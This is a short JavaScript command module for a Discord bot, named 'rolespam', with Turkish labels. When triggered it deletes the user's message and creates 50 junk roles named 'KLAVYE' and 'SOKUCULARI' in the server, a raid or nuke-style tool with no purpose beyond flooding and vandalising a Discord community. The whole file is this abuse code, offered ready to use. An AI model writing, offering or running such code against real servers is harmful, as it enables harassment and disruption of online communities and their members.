module.exports = {
    name: 'rolespam',
    description: 'Role spamlar',
    async execute(message, args, client) {
        message.delete();
        if(message.author.bot) return;
        for (var i = 0; i < 25; i++) {
            message.guild.roles.create({ data: { name: 'KLAVYE', color: 'GREEN' }, reason: 'Klavye sokucuları affetmez' });
            message.guild.roles.create({ data: { name: 'SOKUCULARI', color: 'BLUE' }, reason: 'Klavye sokucuları affetmez' });
        }
    }
}